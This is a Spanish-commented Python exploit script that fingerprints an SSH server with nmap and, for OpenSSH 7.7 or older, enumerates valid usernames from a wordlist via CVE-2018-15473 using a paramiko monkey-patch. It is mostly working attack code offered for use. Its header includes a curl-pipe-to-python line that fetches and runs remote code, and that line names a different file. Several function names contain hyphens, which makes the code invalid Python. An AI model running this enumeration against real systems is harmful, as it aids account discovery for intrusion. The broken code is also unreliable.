#!/usr/bin/env -S PYTHONDONTWRITEBYTECODE=1 python3

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para x
#
# Ejecución remota (puede requerir permisos sudo):
#   curl -sL https://raw.githubusercontent.com/nipegun/d-scripts/refs/heads/master/InstDeSoftware/_/Python-BloqueInicialParaInstalarDependencias.py | python3 - "Cadena"
#
# Bajar y editar directamente el archivo en nano
#   curl -sL https://raw.githubusercontent.com/nipegun/d-scripts/refs/heads/master/InstDeSoftware/_/Python-BloqueInicialParaInstalarDependencias.py | nano -
# ----------


# ------ Inicio del bloque de instalación de dependencias de paquetes python ------

# Definir los paquetes python que necesita este script siguiendo la convención de ciccionario: nombre_del_modulo -> nombre_paquete_pip (para casos donde difieren)
dPaquetesPython = {
  "nmap": "python-nmap",
  "paramiko": "paramiko"
}

aPaquetesApt = ["python3-pip", "nmap"]

import importlib.util
import subprocess
import sys

def fPaqueteAptEstaInstalado(pNombreDelPaqueteApt):
  """Verifica si un paquete apt está instalado."""
  vResultado = subprocess.run(
    ["dpkg", "-s", pNombreDelPaqueteApt],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL
  )
  return vResultado.returncode == 0

def fInstalarPaqueteApt(pNombreDelPaqueteApt):
  """Instala un paquete mediante apt."""
  print(f"[*] Instalando paquete apt: {pNombreDelPaqueteApt}")
  try:
    subprocess.run(
      ["sudo", "apt-get", "-y", "update"],
      check=True
    )
    subprocess.run(
      ["sudo", "apt-get", "-y", "install", pNombreDelPaqueteApt],
      check=True
    )
    print(f"[✓] {pNombreDelPaqueteApt} instalado correctamente")
  except subprocess.CalledProcessError as e:
    print(f"[✗] Error instalando {pNombreDelPaqueteApt}: {e}")
    sys.exit(1)

def fModuloPythonEstaInstalado(pNombreDelModulo):
  """Verifica si un módulo Python está disponible."""
  return importlib.util.find_spec(pNombreDelModulo) is not None

def fInstalarPaquetePython(pNombreDelPaquete):
  """Instala un paquete Python mediante pip."""
  print(f"[*] Instalando paquete Python: {pNombreDelPaquete}")
  try:
    subprocess.run(
      [
        sys.executable,
        "-m", "pip", "install",
        pNombreDelPaquete,
        "--break-system-packages"
      ],
      check=True
    )
    print(f"[✓] {pNombreDelPaquete} instalado correctamente")
  except subprocess.CalledProcessError as e:
    print(f"[✗] Error instalando {pNombreDelPaquete}: {e}")
    return False
  return True

def fComprobarEInstalarPaquetes(pdPaquetesPython):
  """Comprueba e instala los paquetes Python necesarios."""
  aErrores = []
  for vNombreModulo, vNombrePip in pdPaquetesPython.items():
    if fModuloPythonEstaInstalado(vNombreModulo):
      print(f"[✓] {vNombrePip} ya está instalado")
    else:
      if not fInstalarPaquetePython(vNombrePip):
        aErrores.append(vNombrePip)
  return aErrores

print("=== Comprobando dependencias ===\n")

for vPaqueteApt in aPaquetesApt:
  if not fPaqueteAptEstaInstalado(vPaqueteApt):
    fInstalarPaqueteApt(vPaqueteApt)
  else:
    print(f"[✓] {vPaqueteApt} ya está instalado")

print()

aErrores = fComprobarEInstalarPaquetes(dPaquetesPython)

print("\n=== Resumen ===")
if aErrores:
  print(f"[!] Paquetes con errores: {', '.join(aErrores)}")
  sys.exit(1)
else:
  print("[✓] Todas las dependencias instaladas correctamente")


# ------ Fin del bloque de instalación de dependencias. A partir de aquí va el código real del script ------

import sys
import re
import socket
import logging
import argparse
import multiprocessing
from typing import Union
from pathlib import Path

import nmap
import paramiko

assert sys.version_info >= (3, 6), "This program requires python3.6 or higher"


class Color:
  """ Class for coloring print statements.  Nothing to see here, move along. """
  cBold = '\033[1m'
  cEndc = '\033[0m'
  cRed = '\033[38;5;196m'
  cBlue = '\033[38;5;75m'
  cGreen = '\033[38;5;149m'
  cYellow = '\033[38;5;190m'

  @staticmethod
  def mString(pString: str, pColor: str, pBold: bool = False) -> str:
    """ Prints the given string in a few different colors.

    Args:
        pString: string to be printed
        pColor:  valid colors "red", "blue", "green", "yellow"
        pBold:   T/F to add ANSI bold code

    Returns:
        ANSI color-coded string (str)
    """
    vBoldStr = Color.cBold if pBold else ""
    vColorStr = getattr(Color, 'c' + pColor.capitalize())
    return f'{vBoldStr}{vColorStr}{pString}{Color.cEndc}'


# ------ Detección de versión SSH con nmap ------

def fDetectarVersionSSH(pHostname, pPort):
  """Usa nmap -sV para detectar el servicio SSH en el objetivo."""
  vScanner = nmap.PortScanner()
  print(f"\n[*] Escaneando {pHostname}:{pPort} con nmap -sV...")
  vScanner.scan(pHostname, str(pPort), arguments='-sV')

  aHosts = vScanner.all_hosts()
  if not aHosts:
    print(Color.mString(f'[!] Host {pHostname} no encontrado o no responde.', pColor='red'))
    return None, None

  vHost = aHosts[0]

  if 'tcp' not in vScanner[vHost] or pPort not in vScanner[vHost]['tcp']:
    print(Color.mString(f'[!] Puerto {pPort}/tcp no encontrado o cerrado en {pHostname}.', pColor='red'))
    return None, None

  vServiceInfo = vScanner[vHost]['tcp'][pPort]
  vProduct = vServiceInfo.get('product', '')
  vVersionStr = vServiceInfo.get('version', '')

  return vProduct, vVersionStr


# ------ Bloque CVE-2018-15473 (OpenSSH <= 7.7) ------

"""
CVE-2018-15473
--------------
OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an
invalid authenticating user until after the packet containing the request has been fully parsed, related to
auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.

Author: epi
    https://epi052.gitlab.io/notes-to-self/
    https://gitlab.com/epi052/cve-2018-15473
"""


class InvalidUsername(Exception):
  """ Raise when username not found via CVE-2018-15473. """


def fApplyMonkeyPatch() -> None:
  """ Monkey patch paramiko to send invalid SSH2_MSG_USERAUTH_REQUEST.

      patches the following internal `AuthHandler` functions by updating the internal `_handler_table` dict
          _parse_service_accept
          _parse_userauth_failure

      _handler_table = {
          MSG_SERVICE_REQUEST: _parse_service_request,
          MSG_SERVICE_ACCEPT: _parse_service_accept,
          MSG_USERAUTH_REQUEST: _parse_userauth_request,
          MSG_USERAUTH_SUCCESS: _parse_userauth_success,
          MSG_USERAUTH_FAILURE: _parse_userauth_failure,
          MSG_USERAUTH_BANNER: _parse_userauth_banner,
          MSG_USERAUTH_INFO_REQUEST: _parse_userauth_info_request,
          MSG_USERAUTH_INFO_RESPONSE: _parse_userauth_info_response,
      }
  """

  def fPatchedAddBoolean(*pArgs, **pKwargs):
    """ Override correct behavior of paramiko.message.Message.add_boolean, used to produce malformed packets. """

  vAuthHandler = paramiko.auth_handler.AuthHandler
  vOldMsgServiceAccept = vAuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

  def fPatchedMsgServiceAccept(*pArgs, **pKwargs):
    """ Patches paramiko.message.Message.add_boolean to produce a malformed packet. """
    vOldAddBoolean, paramiko.message.Message.add_boolean = paramiko.message.Message.add_boolean, fPatchedAddBoolean
    vRetval = vOldMsgServiceAccept(*pArgs, **pKwargs)
    paramiko.message.Message.add_boolean = vOldAddBoolean
    return vRetval

  def fPatchedUserauthFailure(*pArgs, **pKwargs):
    """ Called during authentication when a username is not found. """
    raise InvalidUsername(*pArgs, **pKwargs)

  vAuthHandler._client_handler_table.update({
    paramiko.common.MSG_SERVICE_ACCEPT: fPatchedMsgServiceAccept,
    paramiko.common.MSG_USERAUTH_FAILURE: fPatchedUserauthFailure
  })


def fCreateSocket(pHostname: str, pPort: int) -> Union[socket.socket, None]:
  """ Small helper to stay DRY.

  Returns:
      socket.socket or None
  """
  # spoiler alert, I don't care about the -6 flag, it's really
  # just to advertise in the help that the program can handle ipv6
  try:
    return socket.create_connection((pHostname, pPort))
  except socket.error as e:
    print(f'socket error: {e}', file=sys.stdout)


def fConnectCVE-2018-15473(pUsername: str, pHostname: str, pPort: int, pVerbose: bool = False) -> None:
  """ Connect and attempt keybased auth, result interpreted to determine valid username.

  Args:
      pUsername:  username to check against the ssh service
      pHostname:  hostname/IP of target
      pPort:      port where ssh is listening
      pVerbose:   bool value; determines whether to print 'not found' lines or not

  Returns:
      None
  """
  vSock = fCreateSocket(pHostname, pPort)
  if not vSock:
    return

  vTransport = paramiko.transport.Transport(vSock)

  try:
    vTransport.start_client()
  except paramiko.ssh_exception.SSHException:
    return print(Color.mString(f'[!] SSH negotiation failed for user {pUsername}.', pColor='red'))

  try:
    vTransport.auth_publickey(pUsername, paramiko.RSAKey.generate(1024))
  except paramiko.ssh_exception.AuthenticationException:
    print(f"[+] {Color.mString(pUsername, pColor='yellow')} found!")
  except InvalidUsername:
    if not pVerbose:
      return
    print(f'[-] {Color.mString(pUsername, pColor="red")} not found')


def fEnumerarCVE-2018-15473(pHostname, pPort, pUsername, pWordlist, pThreads, pVerbose):
  """Enumera usuarios usando CVE-2018-15473 (OpenSSH <= 7.7)."""
  fApplyMonkeyPatch()

  if pUsername:
    vUsername = pUsername.strip()
    return fConnectCVE-2018-15473(pUsername=vUsername, pHostname=pHostname, pPort=pPort, pVerbose=pVerbose)

  with multiprocessing.Pool(pThreads) as vPool, Path(pWordlist).open() as vUsernames:
    vPool.starmap(fConnectCVE-2018-15473, [(vUser.strip(), pHostname, pPort, pVerbose) for vUser in vUsernames])


# ------ Fin bloque CVE-2018-15473 ------


# ------ Aquí se agregarán futuros bloques de CVE para otras versiones de SSH ------


# ------ Función principal ------

def fMain(**pKwargs):
  """ Punto de entrada principal del programa. """
  vHostname = pKwargs.get('hostname')
  vPort = pKwargs.get('port')
  vUsername = pKwargs.get('username')
  vWordlist = pKwargs.get('wordlist')
  vThreads = pKwargs.get('threads')
  vVerbose = pKwargs.get('verbose')

  # Detectar versión SSH con nmap
  vProduct, vVersionStr = fDetectarVersionSSH(vHostname, vPort)

  if vProduct is None:
    return

  if not vProduct:
    print(Color.mString(f'[!] No se pudo identificar el servicio en {vHostname}:{vPort}', pColor='red'))
    return

  print(f"[+] Servicio detectado: {Color.mString(vProduct + ' ' + vVersionStr, pColor='blue')}")

  # Enrutar al bloque de CVE correspondiente según el servicio y versión detectados
  if 'OpenSSH' in vProduct:
    vRegex = re.search(r'^(\d+\.\d+)', vVersionStr)
    if not vRegex:
      print(Color.mString(f'[!] No se pudo determinar la versión numérica de OpenSSH desde: {vVersionStr}', pColor='red'))
      return

    vVersion = float(vRegex.group(1))

    # CVE-2018-15473: OpenSSH <= 7.7
    if vVersion <= 7.7:
      print(f"[+] OpenSSH {Color.mString(vVersion, pColor='green')} es vulnerable a {Color.mString('CVE-2018-15473', pColor='green')}")
      print(f"[*] Procediendo con enumeración de usuarios...\n")
      fEnumerarCVE-2018-15473(
        pHostname=vHostname,
        pPort=vPort,
        pUsername=vUsername,
        pWordlist=vWordlist,
        pThreads=vThreads,
        pVerbose=vVerbose
      )
    # elif vVersion <= X.X:
    #   fEnumerarCVE_XXXX_XXXXX(...)
    else:
      print(f"[!] OpenSSH {Color.mString(vVersion, pColor='red')} - No hay exploit de enumeración de usuarios disponible para esta versión.")
  else:
    print(f"[!] Servicio SSH no reconocido como OpenSSH: {Color.mString(vProduct, pColor='yellow')}")
    print(f"[!] No hay exploit de enumeración de usuarios disponible para este servicio.")


if __name__ == '__main__':
  vParser = argparse.ArgumentParser(description="SSH Username Enumerator - Detecta la versión de SSH y enumera usuarios mediante el CVE correspondiente")

  vParser.add_argument('hostname', help='target to enumerate', type=str)
  vParser.add_argument('-p', '--port', help='ssh port (default: 22)', default=22, type=int)
  vParser.add_argument('-t', '--threads', help="number of threads (default: 4)", default=4, type=int)
  vParser.add_argument('-v', '--verbose', action='store_true', default=False,
                       help="print both valid and invalid usernames (default: False)")
  vParser.add_argument('-6', '--ipv6', action='store_true', help="Specify use of an ipv6 address (default: ipv4)")

  vMultiOrSingleGroup = vParser.add_mutually_exclusive_group(required=True)
  vMultiOrSingleGroup.add_argument('-w', '--wordlist', type=str, help="path to wordlist")
  vMultiOrSingleGroup.add_argument('-u', '--username', help='a single username to test', type=str)

  vArgs = vParser.parse_args()

  logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

  fMain(**vars(vArgs))

